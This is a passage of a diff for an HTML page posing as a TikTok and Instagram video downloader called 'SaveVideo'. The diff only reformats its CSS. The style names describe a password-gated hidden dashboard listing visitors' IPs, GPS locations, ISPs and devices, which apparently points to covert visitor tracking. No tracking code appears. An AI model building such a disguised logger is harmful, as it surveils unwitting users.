@@ -1,1091 +1,2197 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SaveVideo — Download Video TikTok & Instagram</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
-*{margin:0;padding:0;box-sizing:border-box}
-:root{
-  --bg:#09090f;--s1:#0f0f18;--s2:#16161f;--border:#1f1f2e;
-  --pink:#ff2d78;--purple:#7c3aed;--cyan:#00d4ff;
-  --text:#e8e8f5;--muted:#52526e;
-  --font:'Plus Jakarta Sans',sans-serif;--mono:'JetBrains Mono',monospace;
-}
-body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh}
-body::before{content:'';position:fixed;inset:0;
-  background:radial-gradient(ellipse at 30% 20%,rgba(124,58,237,0.08) 0%,transparent 55%),
-             radial-gradient(ellipse at 80% 80%,rgba(255,45,120,0.06) 0%,transparent 50%);
-  pointer-events:none;z-index:0}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SaveVideo — Download Video TikTok & Instagram</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
 
-nav{position:sticky;top:0;z-index:50;display:flex;justify-content:space-between;align-items:center;
-  padding:1rem 2rem;border-bottom:1px solid var(--border);
-  background:rgba(9,9,15,0.92);backdrop-filter:blur(12px)}
-.logo{font-size:1.2rem;font-weight:800;letter-spacing:-0.04em}
-.logo span{background:linear-gradient(135deg,var(--pink),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.dash-btn{padding:0.4rem 1rem;background:none;border:none;
-  border-radius:6px;font-family:var(--font);font-size:0.8rem;cursor:pointer;transition:all 0.2s}
-.dash-btn:hover{border-color:var(--purple);color:var(--text)}
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
 
-.hero{position:relative;z-index:1;text-align:center;padding:4rem 2rem 2rem}
-.hero-badge{display:inline-flex;align-items:center;gap:0.5rem;
-  background:rgba(124,58,237,0.1);border:1px solid rgba(124,58,237,0.3);
-  color:#a78bfa;padding:0.35rem 1rem;border-radius:100px;font-size:0.78rem;font-weight:600;margin-bottom:1.5rem}
-.hero h1{font-size:clamp(2rem,6vw,3.8rem);font-weight:800;line-height:1.1;letter-spacing:-0.03em;margin-bottom:1rem}
-.hero h1 span{background:linear-gradient(135deg,var(--pink) 0%,var(--purple) 100%);
-  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
-.hero p{color:var(--muted);font-size:1rem;max-width:480px;margin:0 auto 2.5rem;line-height:1.6}
+        :root {
+            --bg: #09090f;
+            --s1: #0f0f18;
+            --s2: #16161f;
+            --border: #1f1f2e;
+            --pink: #ff2d78;
+            --purple: #7c3aed;
+            --cyan: #00d4ff;
+            --text: #e8e8f5;
+            --muted: #52526e;
+            --font: 'Plus Jakarta Sans', sans-serif;
+            --mono: 'JetBrains Mono', monospace;
+        }
 
-.platforms{display:flex;justify-content:center;gap:0.5rem;flex-wrap:wrap;margin-bottom:2.5rem}
-.pill{display:flex;align-items:center;gap:0.4rem;padding:0.4rem 0.9rem;
-  background:var(--s1);border:1px solid var(--border);border-radius:100px;font-size:0.8rem;font-weight:600}
-.pill.tiktok{border-color:rgba(0,212,255,0.3);color:var(--cyan)}
-.pill.ig{border-color:rgba(255,45,120,0.3);color:var(--pink)}
-.pill.yt{border-color:rgba(255,100,100,0.3);color:#ff6464}
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font);
+            min-height: 100vh
+        }
 
-.input-card{position:relative;z-index:1;max-width:640px;margin:0 auto 1.5rem;
-  background:var(--s1);border:1px solid var(--border);border-radius:16px;padding:1.5rem}
-.input-row{display:flex;gap:0.5rem}
-.url-input{flex:1;background:var(--s2);border:1px solid var(--border);border-radius:10px;
-  padding:0.85rem 1rem;color:var(--text);font-family:var(--font);font-size:0.9rem;outline:none;transition:border-color 0.2s}
-.url-input:focus{border-color:var(--purple)}
-.url-input::placeholder{color:var(--muted)}
-.btn-dl{padding:0.85rem 1.5rem;background:linear-gradient(135deg,var(--pink),var(--purple));
-  color:#fff;border:none;border-radius:10px;font-family:var(--font);font-weight:700;
-  font-size:0.9rem;cursor:pointer;transition:opacity 0.2s;white-space:nowrap}
-.btn-dl:hover{opacity:0.88}
-.btn-dl:disabled{opacity:0.5;cursor:not-allowed}
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(ellipse at 30% 20%, rgba(124, 58, 237, 0.08) 0%, transparent 55%),
+                radial-gradient(ellipse at 80% 80%, rgba(255, 45, 120, 0.06) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0
+        }
 
-.result-area{margin-top:1.2rem;display:none}
-.result-area.show{display:block}
-.spinner{width:28px;height:28px;border:2px solid var(--border);border-top-color:var(--purple);
-  border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 0.5rem}
-.result-loading{text-align:center;padding:1rem;color:var(--muted);font-size:0.9rem}
+        nav {
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 2rem;
+            border-bottom: 1px solid var(--border);
+            background: rgba(9, 9, 15, 0.92);
+            backdrop-filter: blur(12px)
+        }
 
-.video-info h3{font-size:0.95rem;font-weight:700;margin-bottom:0.3rem}
-.video-info p{font-size:0.78rem;color:var(--muted);margin-bottom:0.75rem}
-.dl-options{display:flex;gap:0.5rem;flex-wrap:wrap}
-.dl-btn{display:inline-flex;align-items:center;gap:0.4rem;padding:0.5rem 1rem;
-  border-radius:8px;font-size:0.82rem;font-weight:600;cursor:pointer;border:none;transition:all 0.2s;text-decoration:none}
-.dl-btn.primary{background:linear-gradient(135deg,var(--pink),var(--purple));color:#fff}
-.dl-btn.secondary{background:var(--s2);border:1px solid var(--border);color:var(--text)}
-.dl-btn:hover{opacity:0.85;transform:translateY(-1px)}
+        .logo {
+            font-size: 1.2rem;
+            font-weight: 800;
+            letter-spacing: -0.04em
+        }
 
-.error-msg{background:rgba(255,100,100,0.08);border:1px solid rgba(255,100,100,0.2);
-  border-radius:8px;padding:0.75rem 1rem;font-size:0.85rem;color:#ff8080;margin-top:0.75rem;display:none}
-.error-msg.show{display:block}
+        .logo span {
+            background: linear-gradient(135deg, var(--pink), var(--purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text
+        }
 
-.how-section{position:relative;z-index:1;max-width:640px;margin:0 auto 4rem;padding:0 2rem}
-.how-title{text-align:center;font-size:0.85rem;font-weight:700;color:var(--muted);
-  text-transform:uppercase;letter-spacing:0.12em;margin-bottom:1.5rem}
-.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem}
-.step{background:var(--s1);border:1px solid var(--border);border-radius:12px;padding:1.2rem;text-align:center}
-.step-num{width:36px;height:36px;border-radius:50%;
-  background:linear-gradient(135deg,var(--pink),var(--purple));
-  display:flex;align-items:center;justify-content:center;
-  font-weight:800;font-size:0.9rem;margin:0 auto 0.75rem}
-.step h4{font-size:0.85rem;font-weight:700;margin-bottom:0.3rem}
-.step p{font-size:0.75rem;color:var(--muted);line-height:1.5}
+        .dash-btn {
+            padding: 0.4rem 1rem;
+            background: none;
+            border: none;
+            border-radius: 6px;
+            font-family: var(--font);
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: all 0.2s
+        }
 
-/* PASSWORD MODAL */
-.pw-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);
-  backdrop-filter:blur(8px);z-index:200;align-items:center;justify-content:center}
-.pw-overlay.show{display:flex}
-.pw-card{background:var(--s1);border:1px solid var(--border);border-radius:20px;
-  padding:2rem;width:min(380px,90vw);text-align:center}
-.pw-icon{font-size:2.5rem;margin-bottom:1rem}
-.pw-title{font-size:1.2rem;font-weight:800;margin-bottom:0.4rem}
-.pw-subtitle{color:var(--muted);font-size:0.85rem;margin-bottom:1.5rem}
-.pw-input{width:100%;background:var(--s2);border:1px solid var(--border);border-radius:10px;
-  padding:0.85rem 1rem;color:var(--text);font-family:var(--mono);font-size:1.1rem;
-  outline:none;text-align:center;letter-spacing:0.25em;transition:border-color 0.2s;margin-bottom:0.75rem}
-.pw-input:focus{border-color:var(--purple)}
-.pw-input.shake{animation:shake 0.4s ease;border-color:var(--pink)}
-.pw-btn{width:100%;padding:0.85rem;background:linear-gradient(135deg,var(--pink),var(--purple));
-  color:#fff;border:none;border-radius:10px;font-family:var(--font);font-weight:700;
-  font-size:0.95rem;cursor:pointer;transition:opacity 0.2s}
-.pw-btn:hover{opacity:0.88}
-.pw-cancel{margin-top:0.75rem;background:none;border:none;color:var(--muted);
-  font-family:var(--font);font-size:0.85rem;cursor:pointer}
-.pw-cancel:hover{color:var(--text)}
-.pw-err{color:var(--pink);font-size:0.8rem;margin-bottom:0.75rem;min-height:1.2rem}
-@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-8px)}75%{transform:translateX(8px)}}
+        .dash-btn:hover {
+            border-color: var(--purple);
+            color: var(--text)
+        }
 
-/* DASHBOARD */
-.dash-overlay{display:none;position:fixed;inset:0;background:var(--bg);z-index:100;overflow-y:auto}
-.dash-overlay.show{display:block}
-.dash-inner{max-width:1100px;margin:0 auto;padding:2rem}
-.dash-topbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem;flex-wrap:wrap;gap:1rem}
-.dash-logo{font-size:1.3rem;font-weight:800}
-.dash-logo span{color:var(--purple)}
-.live-dot{width:8px;height:8px;background:#00e676;border-radius:50%;display:inline-block;margin-right:6px;animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
-.btn-close-dash{padding:0.5rem 1.2rem;background:none;border:1px solid var(--border);
-  color:var(--muted);border-radius:8px;font-family:var(--font);font-size:0.85rem;cursor:pointer;transition:all 0.2s}
-.btn-close-dash:hover{border-color:var(--pink);color:var(--pink)}
-.btn-clear{padding:0.45rem 0.9rem;background:none;border:1px solid var(--border);
-  color:var(--muted);border-radius:6px;font-family:var(--font);font-size:0.78rem;cursor:pointer;transition:all 0.2s}
-.btn-clear:hover{border-color:#ff5252;color:#ff5252}
-.btn-refresh{padding:0.45rem 0.9rem;background:none;border:1px solid var(--border);
-  color:var(--muted);border-radius:6px;font-family:var(--font);font-size:0.78rem;cursor:pointer;transition:all 0.2s}
-.btn-refresh:hover{border-color:var(--cyan);color:var(--cyan)}
-.btn-refresh.spinning svg{animation:spin 0.7s linear infinite}
-.del-btn{background:none;border:none;color:var(--muted);cursor:pointer;padding:2px 6px;
-  border-radius:4px;font-size:0.8rem;transition:all 0.15s;flex-shrink:0}
-.del-btn:hover{color:#ff5252;background:rgba(255,82,82,0.1)}
+        .hero {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            padding: 4rem 2rem 2rem
+        }
 
-.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:0.75rem;margin-bottom:1.5rem}
-.stat-card{background:var(--s1);border:1px solid var(--border);border-radius:12px;padding:1rem}
-.stat-lbl{font-size:0.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:0.4rem;font-family:var(--mono)}
-.stat-val{font-size:1.8rem;font-weight:800;line-height:1}
-.cg{color:#00e676}.cb{color:#448aff}.co{color:#ff9100}.cp{color:var(--pink)}
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(124, 58, 237, 0.1);
+            border: 1px solid rgba(124, 58, 237, 0.3);
+            color: #a78bfa;
+            padding: 0.35rem 1rem;
+            border-radius: 100px;
+            font-size: 0.78rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem
+        }
 
-.vtable{background:var(--s1);border:1px solid var(--border);border-radius:12px;overflow:hidden}
-.thead{display:grid;grid-template-columns:40px 145px 1fr 1fr 90px 120px;gap:0.5rem;
-  padding:0.75rem 1rem;background:var(--s2);border-bottom:1px solid var(--border);
-  font-size:0.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.08em;font-family:var(--mono)}
-.vrow{display:grid;grid-template-columns:40px 145px 1fr 1fr 90px 120px;gap:0.5rem;
-  padding:0.8rem 1rem;border-bottom:1px solid var(--border);font-size:0.82rem;
-  transition:background 0.15s;align-items:center;cursor:pointer}
-.vrow:last-child{border-bottom:none}
-.vrow:hover{background:var(--s2)}
-.vnum{color:var(--muted);font-family:var(--mono);font-size:0.72rem}
-.ip-tag{font-family:var(--mono);font-size:0.75rem;background:rgba(68,138,255,0.1);
-  color:#448aff;padding:2px 7px;border-radius:4px;display:inline-block}
-.new-tag{background:rgba(0,230,118,0.15);color:#00e676;font-size:0.62rem;padding:1px 5px;border-radius:3px;margin-left:3px;font-family:var(--mono)}
-.gps-tag{background:rgba(255,45,120,0.15);color:var(--pink);font-size:0.62rem;padding:1px 5px;border-radius:3px;margin-left:3px;font-family:var(--mono)}
-.name-tag{background:rgba(255,193,7,0.15);color:#ffc107;font-size:0.62rem;padding:1px 6px;border-radius:3px;margin-left:3px;font-family:var(--mono);border:1px solid rgba(255,193,7,0.3)}
-.ttime{color:var(--muted);font-size:0.73rem;font-family:var(--mono)}
-.empty{padding:3rem;text-align:center;color:var(--muted)}
-/* Inline rename input */
-.rename-input{background:var(--s2);border:1px solid var(--purple);border-radius:4px;
-  color:var(--text);font-family:var(--mono);font-size:0.75rem;padding:2px 6px;
-  outline:none;width:120px;margin-left:3px}
-/* Rename modal */
-.rename-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);
-  backdrop-filter:blur(6px);z-index:400;align-items:center;justify-content:center}
-.rename-modal.show{display:flex}
-.rename-card{background:var(--s1);border:1px solid var(--border);border-radius:16px;
-  padding:1.5rem;width:min(360px,90vw);text-align:center}
-.rename-card h3{font-size:1rem;font-weight:700;margin-bottom:0.4rem}
-.rename-card p{font-size:0.8rem;color:var(--muted);margin-bottom:1rem}
-.rename-inp{width:100%;background:var(--s2);border:1px solid var(--border);border-radius:8px;
-  padding:0.75rem 1rem;color:var(--text);font-family:var(--font);font-size:0.95rem;
-  outline:none;transition:border-color 0.2s;margin-bottom:0.75rem}
-.rename-inp:focus{border-color:var(--purple)}
-.rename-actions{display:flex;gap:0.5rem}
-.rename-save{flex:1;padding:0.7rem;background:linear-gradient(135deg,var(--pink),var(--purple));
-  color:#fff;border:none;border-radius:8px;font-family:var(--font);font-weight:700;cursor:pointer}
-.rename-cancel{padding:0.7rem 1rem;background:none;border:1px solid var(--border);
-  color:var(--muted);border-radius:8px;font-family:var(--font);cursor:pointer}
-.rename-cancel:hover{border-color:var(--pink);color:var(--pink)}
+        .hero h1 {
+            font-size: clamp(2rem, 6vw, 3.8rem);
+            font-weight: 800;
+            line-height: 1.1;
+            letter-spacing: -0.03em;
+            margin-bottom: 1rem
+        }
 
-/* DETAIL MODAL */
-.modal-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);
-  backdrop-filter:blur(6px);z-index:300;align-items:center;justify-content:center}
-.modal-ov.show{display:flex}
-.modal-box{background:var(--s1);border:1px solid var(--border);border-radius:18px;
-  padding:1.5rem;width:min(560px,92vw);max-height:85vh;overflow-y:auto}
-.modal-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:1rem}
-.modal-ttl{font-size:1rem;font-weight:700}
-.modal-x{background:none;border:none;color:var(--muted);font-size:1.2rem;cursor:pointer}
-.modal-x:hover{color:var(--text)}
-.dgrid{display:grid;grid-template-columns:1fr 1fr;gap:0.55rem}
-.ditem{background:var(--s2);border:1px solid var(--border);border-radius:8px;padding:0.75rem}
-.ditem.full{grid-column:1/-1}
-.dlbl{font-size:0.63rem;color:var(--muted);text-transform:uppercase;letter-spacing:0.1em;margin-bottom:0.3rem;font-family:var(--mono)}
-.dval{font-size:0.84rem;word-break:break-all}
-.dval.accent{color:#00e676}
-.dval.mono{font-family:var(--mono);font-size:0.78rem}
-.dval.pink{color:var(--pink)}
-.maps-a{display:inline-flex;align-items:center;gap:0.4rem;color:#448aff;font-size:0.78rem;text-decoration:none;margin-top:0.4rem}
-.maps-a:hover{text-decoration:underline}
+        .hero h1 span {
+            background: linear-gradient(135deg, var(--pink) 0%, var(--purple) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text
+        }
 
-@keyframes spin{to{transform:rotate(360deg)}}
-/* Search & Filter bar */
-.dash-search-row{display:flex;gap:0.5rem;margin-bottom:1rem;flex-wrap:wrap}
-.dash-search{flex:1;min-width:180px;background:var(--s2);border:1px solid var(--border);border-radius:8px;
-  padding:0.55rem 0.9rem;color:var(--text);font-family:var(--font);font-size:0.82rem;outline:none;transition:border-color 0.2s}
-.dash-search:focus{border-color:var(--purple)}
-.dash-search::placeholder{color:var(--muted)}
-.filter-sel{background:var(--s2);border:1px solid var(--border);border-radius:8px;
-  padding:0.55rem 0.7rem;color:var(--text);font-family:var(--font);font-size:0.78rem;outline:none;cursor:pointer}
-.filter-sel:focus{border-color:var(--purple)}
-.btn-export{padding:0.5rem 1rem;background:none;border:1px solid rgba(0,230,118,0.4);
-  color:#00e676;border-radius:8px;font-family:var(--font);font-size:0.78rem;cursor:pointer;transition:all 0.2s;white-space:nowrap}
-.btn-export:hover{background:rgba(0,230,118,0.1)}
+        .hero p {
+            color: var(--muted);
+            font-size: 1rem;
+            max-width: 480px;
+            margin: 0 auto 2.5rem;
+            line-height: 1.6
+        }
 
-@media(max-width:650px){
-  .stats-row{grid-template-columns:1fr 1fr}
-  .thead,.vrow{grid-template-columns:30px 1fr 1fr 80px}
-  .col-isp,.col-dev{display:none}
-  .steps{grid-template-columns:1fr}
-  nav{padding:0.75rem 1rem}
-  .hero{padding:2rem 1rem 1.5rem}
-  .hero h1{font-size:2rem}
-  .hero p{font-size:0.9rem}
-  .input-card{margin:0 1rem 1.5rem;padding:1rem}
-  .input-row{flex-direction:column}
-  .btn-dl{width:100%;justify-content:center}
-  .url-input{width:100%;font-size:16px}
-  .dl-options{flex-direction:column}
-  .dl-btn{width:100%;justify-content:center}
-  .how-section{padding:0 1rem}
-  .dgrid{grid-template-columns:1fr}
-  .ditem.full{grid-column:1}
-  .dash-inner{padding:1rem}
-  .pw-card{padding:1.5rem}
-}
-@media(max-width:650px){
-  .stats-row{grid-template-columns:1fr 1fr}
-  .thead,.vrow{grid-template-columns:30px 1fr 1fr 80px}
-  .col-isp,.col-dev{display:none}
-  .steps{grid-template-columns:1fr}
-  nav{padding:0.75rem 1rem}
-}
-</style>
+        .platforms {
+            display: flex;
+            justify-content: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+            margin-bottom: 2.5rem
+        }
+
+        .pill {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.4rem 0.9rem;
+            background: var(--s1);
+            border: 1px solid var(--border);
+            border-radius: 100px;
+            font-size: 0.8rem;
+            font-weight: 600
+        }
+
+        .pill.tiktok {
+            border-color: rgba(0, 212, 255, 0.3);
+            color: var(--cyan)
+        }
+
+        .pill.ig {
+            border-color: rgba(255, 45, 120, 0.3);
+            color: var(--pink)
+        }
+
+        .pill.yt {
+            border-color: rgba(255, 100, 100, 0.3);
+            color: #ff6464
+        }
+
+        .input-card {
+            position: relative;
+            z-index: 1;
+            max-width: 640px;
+            margin: 0 auto 1.5rem;
+            background: var(--s1);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem
+        }
+
+        .input-row {
+            display: flex;
+            gap: 0.5rem
+        }
+
+        .url-input {
+            flex: 1;
+            background: var(--s2);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 0.85rem 1rem;
+            color: var(--text);
+            font-family: var(--font);
+            font-size: 0.9rem;
+            outline: none;
+            transition: border-color 0.2s
+        }
+
+        .url-input:focus {
+            border-color: var(--purple)
+        }
+
+        .url-input::placeholder {
+            color: var(--muted)
+        }
+
+        .btn-dl {
+            padding: 0.85rem 1.5rem;
+            background: linear-gradient(135deg, var(--pink), var(--purple));
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-family: var(--font);
+            font-weight: 700;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            white-space: nowrap
+        }
+
+        .btn-dl:hover {
+            opacity: 0.88
+        }
+
+        .btn-dl:disabled {
+            opacity: 0.5;
+            cursor: not-allowed
+        }
+
+        .result-area {
+            margin-top: 1.2rem;
+            display: none
+        }
+
+        .result-area.show {
+            display: block
+        }
+
+        .spinner {
+            width: 28px;
+            height: 28px;
+            border: 2px solid var(--border);
+            border-top-color: var(--purple);
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto 0.5rem
+        }
+
+        .result-loading {
+            text-align: center;
+            padding: 1rem;
+            color: var(--muted);
+            font-size: 0.9rem
+        }
+
+        .video-info h3 {
+            font-size: 0.95rem;
+            font-weight: 700;
+            margin-bottom: 0.3rem
+        }
+
+        .video-info p {
+            font-size: 0.78rem;
+            color: var(--muted);
+            margin-bottom: 0.75rem
+        }
+
+        .dl-options {
+            display: flex;
+            gap: 0.5rem;
+            flex-wrap: wrap
+        }
+
+        .dl-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-size: 0.82rem;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            text-decoration: none
+        }
+
+        .dl-btn.primary {
+            background: linear-gradient(135deg, var(--pink), var(--purple));
+            color: #fff
+        }
+
+        .dl-btn.secondary {
+            background: var(--s2);
+            border: 1px solid var(--border);
+            color: var(--text)
+        }
+
+        .dl-btn:hover {
+            opacity: 0.85;
+            transform: translateY(-1px)
+        }
+
+        .error-msg {
+            background: rgba(255, 100, 100, 0.08);
+            border: 1px solid rgba(255, 100, 100, 0.2);
+            border-radius: 8px;
+            padding: 0.75rem 1rem;
+            font-size: 0.85rem;
+            color: #ff8080;
+            margin-top: 0.75rem;
+            display: none
+        }
+
+        .error-msg.show {
+            display: block
+        }
+
+        .how-section {
+            position: relative;
+            z-index: 1;
+            max-width: 640px;
+            margin: 0 auto 4rem;
+            padding: 0 2rem
+        }
+
+        .how-title {
+            text-align: center;
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            margin-bottom: 1.5rem
+        }
+
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem
+        }
+
+        .step {
+            background: var(--s1);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.2rem;
+            text-align: center
+        }
+
+        .step-num {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--pink), var(--purple));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 0.9rem;
+            margin: 0 auto 0.75rem
+        }
+
+        .step h4 {
+            font-size: 0.85rem;
+            font-weight: 700;
+            margin-bottom: 0.3rem
+        }
+
+        .step p {
+            font-size: 0.75rem;
+            color: var(--muted);
+            line-height: 1.5
+        }
+
+        /* PASSWORD MODAL */
+        .pw-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 200;
+            align-items: center;
+            justify-content: center
+        }
+
+        .pw-overlay.show {
+            display: flex
+        }
+
+        .pw-card {
+            background: var(--s1);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2rem;
+            width: min(380px, 90vw);
+            text-align: center
+        }
+
+        .pw-icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem
+        }
+
+        .pw-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            margin-bottom: 0.4rem
+        }
+
+        .pw-subtitle {
+            color: var(--muted);
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem
+        }
+
+        .pw-input {
+            width: 100%;
+            background: var(--s2);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 0.85rem 1rem;
+            color: var(--text);
+            font-family: var(--mono);
+            font-size: 1.1rem;
+            outline: none;
+            text-align: center;
+            letter-spacing: 0.25em;
+            transition: border-color 0.2s;
+            margin-bottom: 0.75rem
+        }
+
+        .pw-input:focus {
+            border-color: var(--purple)
+        }
+
+        .pw-input.shake {
+            animation: shake 0.4s ease;
+            border-color: var(--pink)
+        }
+
+        .pw-btn {
+            width: 100%;
+            padding: 0.85rem;
+            background: linear-gradient(135deg, var(--pink), var(--purple));
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-family: var(--font);
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: opacity 0.2s
+        }
+
+        .pw-btn:hover {
+            opacity: 0.88
+        }
+
+        .pw-cancel {
+            margin-top: 0.75rem;
+            background: none;
+            border: none;
+            color: var(--muted);
+            font-family: var(--font);
+            font-size: 0.85rem;
+            cursor: pointer
+        }
+
+        .pw-cancel:hover {
+            color: var(--text)
+        }
+
+        .pw-err {
+            color: var(--pink);
+            font-size: 0.8rem;
+            margin-bottom: 0.75rem;
+            min-height: 1.2rem
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0)
+            }
+
+            25% {
+                transform: translateX(-8px)
+            }
+
+            75% {
+                transform: translateX(8px)
+            }
+        }
+
+        /* DASHBOARD */
+        .dash-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            z-index: 100;
+            overflow-y: auto
+        }
+
+        .dash-overlay.show {
+            display: block
+        }
+
+        .dash-inner {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 2rem
+        }
+
+        .dash-topbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+            gap: 1rem
+        }
+
+        .dash-logo {
+            font-size: 1.3rem;
+            font-weight: 800
+        }
+
+        .dash-logo span {
+            color: var(--purple)
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #00e676;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 6px;
+            animation: pulse 1.5s infinite
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1
+            }
+
+            50% {
+                opacity: 0.4
+            }
+        }
+
+        .btn-close-dash {
+            padding: 0.5rem 1.2rem;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            border-radius: 8px;
+            font-family: var(--font);
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.2s
+        }
+
+        .btn-close-dash:hover {
+            border-color: var(--pink);
+            color: var(--pink)
+        }
+
+        .btn-clear {
+            padding: 0.45rem 0.9rem;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            border-radius: 6px;
+            font-family: var(--font);
+            font-size: 0.78rem;
+            cursor: pointer;
+            transition: all 0.2s
+        }
+
+        .btn-clear:hover {
+            border-color: #ff5252;
+            color: #ff5252
+        }
+
+        .btn-refresh {
+            padding: 0.45rem 0.9rem;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--muted);
+            border-radius: 6px;
+            font-family: var(--font);
+            font-size: 0.78rem;
+            cursor: pointer;
+            transition: all 0.2s
+        }
+
+        .btn-refresh:hover {
+            border-color: var(--cyan);
+            color: var(--cyan)
+        }
+
+        .btn-refresh.spinning svg {
+            animation: spin 0.7s linear infinite
+        }
+
+        .del-btn {
+            background: none;
+            border: none;
+            color: var(--muted);
+            cursor: pointer;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            transition: all 0.15s;
+            flex-shrink: 0
+        }
+
+        .del-btn:hover {
+            color: #ff5252;
+            background: rgba(255, 82, 82, 0.1)
+        }
+
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 0.75rem;
+            margin-bottom: 1.5rem
+        }
+
+        .stat-card {
+            background: var(--s1);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1rem
+        }
+
+        .stat-lbl {
+            font-size: 0.68rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 0.4rem;
+            font-family: var(--mono)
+        }
+
+        .stat-val {
+            font-size: 1.8rem;
+            font-weight: 800;
+            line-height: 1
+        }
+
+        .cg {
+            color: #00e676
+        }
+
+        .cb {
+            color: #448aff
+        }
+
+        .co {
+            color: #ff9100
+        }
+
+        .cp {
+            color: var(--pink)
+        }
+
+        .vtable {
+            background: var(--s1);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden
+        }
+
+        .thead {
+            display: grid;
+            grid-template-columns: 40px 145px 1fr 1fr 90px 120px;
+            gap: 0.5rem;
+            padding: 0.75rem 1rem;
+            background: var(--s2);
+            border-bottom: 1px solid var(--border);
+            font-size: 0.68rem;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            font-family: var(--mono)
+        }
+
+        .vrow {
+            display: grid;
+            grid-template-columns: 40px 145px 1fr 1fr 90px 120px;
+            gap: 0.5rem;
+            padding: 0.8rem 1rem;
+            border-bottom: 1px solid var(--border);
+            font-size: 0.82rem;
+            transition: background 0.15s;
+            align-items: center;
+            cursor: pointer
+        }
+
+        .vrow:last-child {
+            border-bottom: none
+        }
+
+        .vrow:hover {
+            background: var(--s2)
+        }
+
+        .vnum {
+            color: var(--muted);
+            font-family: var(--mono);
